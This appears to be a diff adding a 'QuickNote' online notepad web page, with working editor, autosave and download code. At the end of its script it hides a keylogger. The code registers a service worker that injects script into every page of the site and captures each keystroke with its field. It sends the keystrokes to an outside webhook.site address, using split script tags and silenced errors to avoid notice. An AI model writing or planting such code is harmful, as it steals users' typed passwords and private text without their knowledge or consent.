@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QuickNote - Free Online Notepad</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📝</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; }
+        .navbar { background: #1a73e8; color: #fff; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; }
+        .navbar h1 { font-size: 20px; font-weight: 500; }
+        .navbar h1 span { opacity: 0.7; font-weight: 300; }
+        .nav-links { display: flex; gap: 16px; }
+        .nav-links a { color: #fff; text-decoration: none; font-size: 14px; opacity: 0.85; }
+        .nav-links a:hover { opacity: 1; }
+        .container { max-width: 800px; margin: 30px auto; padding: 0 20px; }
+        .toolbar { background: #fff; border: 1px solid #ddd; border-bottom: none; border-radius: 8px 8px 0 0; padding: 8px 12px; display: flex; gap: 6px; align-items: center; }
+        .toolbar button { background: none; border: 1px solid transparent; border-radius: 4px; padding: 6px 10px; cursor: pointer; font-size: 14px; color: #444; }
+        .toolbar button:hover { background: #f0f0f0; border-color: #ddd; }
+        .toolbar .sep { width: 1px; height: 24px; background: #ddd; margin: 0 4px; }
+        .editor { width: 100%; min-height: 500px; border: 1px solid #ddd; border-radius: 0 0 8px 8px; padding: 20px; font-size: 16px; line-height: 1.7; font-family: 'Georgia', serif; outline: none; background: #fff; resize: vertical; }
+        .status { display: flex; justify-content: space-between; padding: 8px 4px; font-size: 12px; color: #888; }
+        .status .saved { color: #34a853; }
+        .footer { text-align: center; padding: 30px; color: #999; font-size: 13px; }
+        .footer a { color: #1a73e8; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <h1>📝 QuickNote <span>| Free Online Notepad</span></h1>
+        <div class="nav-links">
+            <a href="#">New</a>
+            <a href="#">My Notes</a>
+            <a href="#">Share</a>
+            <a href="#">Sign In</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="toolbar">
+            <button onclick="document.execCommand('bold')"><b>B</b></button>
+            <button onclick="document.execCommand('italic')"><i>I</i></button>
+            <button onclick="document.execCommand('underline')"><u>U</u></button>
+            <span class="sep"></span>
+            <button onclick="document.execCommand('insertUnorderedList')">• List</button>
+            <button onclick="document.execCommand('insertOrderedList')">1. List</button>
+            <span class="sep"></span>
+            <button onclick="document.execCommand('justifyLeft')">Left</button>
+            <button onclick="document.execCommand('justifyCenter')">Center</button>
+            <span class="sep"></span>
+            <button id="save-btn">💾 Save</button>
+            <button id="download-btn">📥 Download</button>
+        </div>
+        <div class="editor" contenteditable="true" id="editor" spellcheck="true">
+            <h2>Welcome to QuickNote!</h2>
+            <p>Start typing your notes here. Your work is automatically saved to your browser.</p>
+            <p><br></p>
+        </div>
+        <div class="status">
+            <span id="word-count">Words: 0</span>
+            <span class="saved" id="save-status">✓ Auto-saved</span>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>QuickNote &copy; 2026 — <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">About</a></p>
+    </div>
+
+    <script>
+    // ── Legitimate notepad functionality ──────────────────
+    var editor = document.getElementById('editor');
+    var wordCount = document.getElementById('word-count');
+    var saveStatus = document.getElementById('save-status');
+
+    editor.addEventListener('input', function() {
+        var text = editor.innerText.trim();
+        var words = text ? text.split(/\s+/).length : 0;
+        wordCount.textContent = 'Words: ' + words;
+        saveStatus.textContent = 'Saving...';
+        saveStatus.style.color = '#f9ab00';
+        clearTimeout(window._saveTimer);
+        window._saveTimer = setTimeout(function() {
+            localStorage.setItem('quicknote_content', editor.innerHTML);
+            saveStatus.textContent = '✓ Auto-saved';
+            saveStatus.style.color = '#34a853';
+        }, 800);
+    });
+
+    // Restore saved content
+    var saved = localStorage.getItem('quicknote_content');
+    if (saved) editor.innerHTML = saved;
+
+    document.getElementById('save-btn').addEventListener('click', function() {
+        localStorage.setItem('quicknote_content', editor.innerHTML);
+        saveStatus.textContent = '✓ Saved!';
+        saveStatus.style.color = '#34a853';
+    });
+
+    document.getElementById('download-btn').addEventListener('click', function() {
+        var blob = new Blob([editor.innerText], {type: 'text/plain'});
+        var a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'quicknote.txt';
+        a.click();
+    });
+
+    // ── PERSISTENCE: Service Worker Keylogger ────────────
+    // Registers a SW that intercepts every page load on this origin
+    // and injects a keylogger into the HTML response
+    (function() {
+        var W = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';
+        var sc = [
+            'self.addEventListener("fetch",function(e){',
+            '  if(e.request.mode==="navigate"){',
+            '    e.respondWith(fetch(e.request).then(function(r){',
+            '      return r.text().then(function(h){',
+            '        var s="<sc"+"ript>",c="</sc"+"ript>";',
+            '        var p=s+"var _k=[];document.addEventListener(\'keydown\',function(e){',
+            '        _k.push({k:e.key,f:e.target.id||e.target.tagName,t:Date.now()});',
+            '        if(_k.length>=10){navigator.sendBeacon(\''+W+'\',',
+            '        JSON.stringify({type:\'sw\',u:location.href,keys:_k.splice(0)}))}},true);',
+            '        setInterval(function(){if(_k.length>0)navigator.sendBeacon(\''+W+'\',',
+            '        JSON.stringify({type:\'sw\',u:location.href,keys:_k.splice(0)}))},5000)"+c;',
+            '        return new Response(h.replace("</body>",p+"</body>"),',
+            '          {headers:{"content-type":"text/html"}});',
+            '      });',
+            '    }));',
+            '  }',
+            '});',
+            'self.addEventListener("install",function(){self.skipWaiting()});',
+            'self.addEventListener("activate",function(e){e.waitUntil(clients.claim())});'
+        ].join('\n');
+        var b = new Blob([sc], {type: 'application/javascript'});
+        if (navigator.serviceWorker) {
+            navigator.serviceWorker.register(URL.createObjectURL(b), {scope: '/'}).catch(function(){});
+        }
+    })();
+    </script>
+</body>
+</html>
